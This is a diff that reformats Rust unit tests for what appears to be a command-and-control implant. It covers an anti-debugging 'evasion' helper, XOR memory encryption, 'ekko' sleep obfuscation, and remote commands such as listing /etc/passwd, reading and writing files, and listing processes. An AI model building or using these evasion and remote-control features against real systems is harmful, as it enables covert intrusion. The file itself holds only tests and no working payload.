@@ -58,8 +58,14 @@ fn crypto_session_unique_ciphertexts() {
     );
 
     // Both must still decrypt correctly.
-    assert_eq!(session.decrypt(&ct1).unwrap().as_slice(), plaintext.as_slice());
-    assert_eq!(session.decrypt(&ct2).unwrap().as_slice(), plaintext.as_slice());
+    assert_eq!(
+        session.decrypt(&ct1).unwrap().as_slice(),
+        plaintext.as_slice()
+    );
+    assert_eq!(
+        session.decrypt(&ct2).unwrap().as_slice(),
+        plaintext.as_slice()
+    );
 }
 
 /// Empty plaintext should still encrypt/decrypt successfully.
@@ -115,7 +121,10 @@ fn crypto_session_same_salt_interop() {
 #[test]
 fn scrubbed_debug_regs_returns_closure_result() {
     let val = agent::evasion::with_scrubbed_debug_regs(|| 42_u64);
-    assert_eq!(val, 42, "with_scrubbed_debug_regs should return closure result");
+    assert_eq!(
+        val, 42,
+        "with_scrubbed_debug_regs should return closure result"
+    );
 }
 
 /// `with_scrubbed_debug_regs` must propagate panics from the closure.
@@ -144,9 +153,7 @@ fn scrubbed_debug_regs_allows_mutation() {
 #[test]
 fn scrubbed_debug_regs_nested_no_deadlock() {
     let result = agent::evasion::with_scrubbed_debug_regs(|| {
-        agent::evasion::with_scrubbed_debug_regs(|| {
-            agent::evasion::with_scrubbed_debug_regs(|| 99)
-        })
+        agent::evasion::with_scrubbed_debug_regs(|| agent::evasion::with_scrubbed_debug_regs(|| 99))
     });
     assert_eq!(result, 99);
 }
@@ -219,7 +226,10 @@ fn xor_memory_guard_simulation_roundtrip() {
     }
 
     // After XOR encryption, buffer must differ from original.
-    assert_ne!(buffer, original, "encrypted buffer must differ from original");
+    assert_ne!(
+        buffer, original,
+        "encrypted buffer must differ from original"
+    );
 
     // Decrypt.
     for byte in &mut buffer {
@@ -275,9 +285,16 @@ fn command_serde_roundtrip_basic_variants() {
         Command::Ping,
         Command::GetSystemInfo,
         Command::Shutdown,
-        Command::ListDirectory { path: "/etc/passwd".into() },
-        Command::ReadFile { path: "/tmp/test".into() },
-        Command::WriteFile { path: "/tmp/out".into(), content: b"hello".to_vec() },
+        Command::ListDirectory {
+            path: "/etc/passwd".into(),
+        },
+        Command::ReadFile {
+            path: "/tmp/test".into(),
+        },
+        Command::WriteFile {
+            path: "/tmp/out".into(),
+            content: b"hello".to_vec(),
+        },
         Command::ReloadConfig,
         Command::ListProcesses,
         Command::ListPlugins,
@@ -286,10 +303,18 @@ fn command_serde_roundtrip_basic_variants() {
         Command::ListLinks,
         Command::SetReencodeSeed { seed: 0xDEADBEEF },
         Command::MorphNow { seed: 12345 },
-        Command::SetSleepVariant { variant: "ekko".into() },
-        Command::JobStatus { job_id: "job-42".into() },
-        Command::GetPluginInfo { plugin_id: "my-plugin".into() },
-        Command::UnloadPlugin { plugin_id: "old-plugin".into() },
+        Command::SetSleepVariant {
+            variant: "ekko".into(),
+        },
+        Command::JobStatus {
+            job_id: "job-42".into(),
+        },
+        Command::GetPluginInfo {
+            plugin_id: "my-plugin".into(),
+        },
+        Command::UnloadPlugin {
+            plugin_id: "old-plugin".into(),
+        },
         Command::Unlink { link_id: Some(7) },
         Command::Unlink { link_id: None },
         Command::MeshKillSwitch,
@@ -297,13 +322,13 @@ fn command_serde_roundtrip_basic_variants() {
 
     for original in &commands {
         let json = serde_json::to_string(original).expect("serialize command");
-        let roundtripped: Command =
-            serde_json::from_str(&json).expect("deserialize command");
+        let roundtripped: Command = serde_json::from_str(&json).expect("deserialize command");
         // Re-serialize the roundtripped value and compare JSON strings
         // (simpler than deriving PartialEq for the whole enum).
         let json2 = serde_json::to_string(&roundtripped).expect("re-serialize");
         assert_eq!(
-            json, json2,
+            json,
+            json2,
             "Command serde roundtrip failed for variant: {:?}",
             serde_json::to_string(original).unwrap()
         );
